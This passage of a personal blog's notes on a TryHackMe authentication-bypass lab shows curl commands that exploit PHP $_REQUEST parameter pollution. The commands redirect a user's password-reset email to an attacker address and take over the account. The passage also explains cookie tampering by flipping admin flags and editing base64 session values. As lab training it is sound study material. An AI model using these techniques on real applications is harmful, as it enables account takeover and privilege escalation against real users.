+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span> <span class="n">url</span><span class="mf">.</span><span class="nb">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">===</span> <span class="s1">'/admin'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1"># Code to check user is an admin</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1"># View Page</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>![[Pasted image 20241110173333.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241110173346.png</td>
+      <td>by seing this we could understand that the <em>robert</em> is a valid username with a useremail as robert@acmeitsupport.thm]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="s1">'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-d</span> <span class="s1">'username=robert'</span>
+
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-17-188:~# curl 'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Acme IT Support - Customer Login<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://pro.fontawesome.com/releases/v5.12.0/css/all.css"</span> <span class="na">integrity=</span><span class="s">"sha384ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/assets/bootstrap.min.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/assets/style.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"navbar navbar-inverse navbar-fixed-top"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-header"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"navbar-toggle collapsed"</span> <span class="na">data-toggle=</span><span class="s">"collapse"</span> <span class="na">data-target=</span><span class="s">"#navbar"</span> <span class="na">aria-expanded=</span><span class="s">"false"</span> <span class="na">aria-controls=</span><span class="s">"navbar"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"sr-only"</span><span class="nt">&gt;</span>Toggle navigation<span class="nt">&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                <span class="nt">&lt;/button&gt;</span>
+                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"navbar-brand"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Acme IT Support<span class="nt">&lt;/a&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"navbar"</span> <span class="na">class=</span><span class="s">"collapse navbar-collapse"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav navbar-nav"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/news"</span><span class="nt">&gt;</span>News<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"active"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/customers"</span><span class="nt">&gt;</span>Customers<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                <span class="nt">&lt;/ul&gt;</span>
+            <span class="nt">&lt;/div&gt;</span><span class="c">&lt;!--/.nav-collapse --&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/nav&gt;&lt;div</span> <span class="na">class=</span><span class="s">"container"</span> <span class="na">style=</span><span class="s">"padding-top:60px"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>Acme IT Support<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>Reset Password<span class="nt">&lt;/h2&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4 col-md-offset-4"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-success text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;p&gt;</span>We'll send you a reset email to <span class="nt">&lt;strong&gt;</span>robert@acmeitsupport.thm<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/site.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+<span class="c">&lt;!--
+Page Generated in 0.05322 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
+
+</span></code></pre></div></div>
+
+<p>![[Pasted image 20241112092245.png]]
+We use the <code class="language-plaintext highlighter-rouge">-H</code> flag to add an additional header to the request. In this instance, we are setting the <code class="language-plaintext highlighter-rouge">Content-Type</code> to <code class="language-plaintext highlighter-rouge">application/x-www-form-urlencoded</code>, which lets the web server know we are sending form data so it properly understands our request.</p>
+
+<p>In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable <code class="language-plaintext highlighter-rouge">$_REQUEST</code>. </p>
+
+<p>The PHP <code class="language-plaintext highlighter-rouge">$_REQUEST</code> variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>curl <span class="s1">'http://10.10.241.173/customers/reset?email=robert%40acmeitsupport.thm'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-d</span> <span class="s1">'username=robert&amp;email=attacker@hacker.com'</span>
+</code></pre></div></div>
+
+<p>![[Pasted image 20241112092135.png]]</p>
+
+<p>so we could see that the vulnerablility allows us to login to any other user id and in the same way we could build our profile and then pass the email of ours and send a POST request to the user and raise a ticket for login of robert</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--&gt;root@ip-10-10-17-188:~# curl 'http://10.10.241.173/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlened' -d 'username=robert<span class="err">&amp;</span>email=mrp@customer.acmeitsupport.thm'
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Acme IT Support - Customer Login<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://pro.fontawesome.com/releases/v5.12.0/css/all.css"</span> <span class="na">integrity=</span><span class="s">"sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/assets/bootstrap.min.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"/assets/style.css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"navbar navbar-inverse navbar-fixed-top"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-header"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"navbar-toggle collapsed"</span> <span class="na">data-toggle=</span><span class="s">"collapse"</span> <span class="na">data-target=</span><span class="s">"#navbar"</span> <span class="na">aria-expanded=</span><span class="s">"false"</span> <span class="na">aria-controls=</span><span class="s">"navbar"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"sr-only"</span><span class="nt">&gt;</span>Toggle navigation<span class="nt">&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
+                <span class="nt">&lt;/button&gt;</span>
+                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"navbar-brand"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Acme IT Support<span class="nt">&lt;/a&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"navbar"</span> <span class="na">class=</span><span class="s">"collapse navbar-collapse"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav navbar-nav"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/news"</span><span class="nt">&gt;</span>News<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/contact"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"active"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/customers"</span><span class="nt">&gt;</span>Customers<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                <span class="nt">&lt;/ul&gt;</span>
+            <span class="nt">&lt;/div&gt;</span><span class="c">&lt;!--/.nav-collapse --&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/nav&gt;&lt;div</span> <span class="na">class=</span><span class="s">"container"</span> <span class="na">style=</span><span class="s">"padding-top:60px"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>Acme IT Support<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>Reset Password<span class="nt">&lt;/h2&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4 col-md-offset-4"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-success text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;p&gt;</span>We'll send you a reset email to <span class="nt">&lt;strong&gt;</span>mrp@customer.acmeitsupport.thm<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/assets/site.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+<span class="c">&lt;!--
+Page Generated in 0.03316 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
+
+
+</span></code></pre></div></div>
+
+<p>![[Pasted image 20241112093449.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241112093551.png</td>
+      <td>the support ticket that has been generated by us to our fake user ]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241112093653.png</td>
+      <td>the support ticket that has been generated and we are login in]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241112093813.png</td>
+      <td>now we are into robert’s account]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>and by opening the new ticket we got the <strong>flag</strong></li>
+</ul>
+
+<h4 id="cookie-tampering">Cookie Tampering</h4>
+
+<p>Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user’s account, or elevated privileges. If you need a refresher on cookies, check out the <a href="https://tryhackme.com/room/httpindetail">HTTP In Detail</a> room on task 6.</p>
+
+<p><strong>Plain Text</strong></p>
+
+<p>The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:</p>
+
+<p><strong>Set-Cookie: logged_in=true; Max-Age=3600; Path=/</strong><br />
+<strong>**Set-Cookie: admin=false; Max-Age=3600; Path=/</strong>**</p>
+
+<p>We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we’ll be able to change our privileges.</p>
+
+<p>First, we’ll start just by requesting the target page:</p>
+
+<p>Curl Request 1</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>curl http://10.10.6.238/cookie-test
+</code></pre></div></div>
+
+<p>We can see we are returned a message of: <strong>Not Logged In</strong></p>
+
+<p>Now we’ll send another request with the logged_in cookie set to true and the admin cookie set to false:</p>
+
+<p>Curl Request 2</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s2">"Cookie: logged_in=true; admin=false"</span> http://10.10.6.238/cookie-test
+</code></pre></div></div>
+
+<p>We are given the message: <strong>Logged In As A User</strong></p>
+
+<p>Finally, we’ll send one last request setting both the logged_in and admin cookie to true:</p>
+
+<p>Curl Request 3</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s2">"Cookie: logged_in=true; admin=true"</span> http://10.10.6.238/cookie-test
+</code></pre></div></div>
+
+<p>This returns the result: <strong>Logged In As An Admin</strong> as well as a flag which you can use to answer question one.</p>
+
+<p><strong>Hashing</strong></p>
+
+<p>Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Original String</strong></td>
+      <td><strong>Hash Method</strong></td>
+      <td><strong>Output</strong></td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>md5</td>
+      <td>c4ca4238a0b923820dcc509a6f75849b</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>sha-256</td>
+      <td>6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>sha-512</td>
+      <td>4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>sha1</td>
+      <td>356a192b7913b04c54574d18c28d46e6395428ab</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as <a href="https://crackstation.net/">https://crackstation.net/</a> keep databases of billions of hashes and their original strings.</p>
+
+<p><strong>Encoding</strong></p>
+
+<p>Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.</p>
+
+<p>Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.</p>
+
+<p>Take the below data as an example which is set by the web server upon logging in:</p>
+
+<p><strong>**Set-Cookie:</strong> session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/**</p>
+
+<p>This string base64 decoded has the value of <strong>{“id”:1,”admin”: false}</strong> we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.</p>
+
+<script>
+function copyToClipboard(btn) {
+  const code = btn.nextElementSibling.innerText;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.innerText = "✅ Copied!";
+    setTimeout(() => btn.innerText = "📋 Copy", 1500);
+  });
+}
+</script>
+
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>MrP</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="https://www.github.com/Mrp-cpu"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
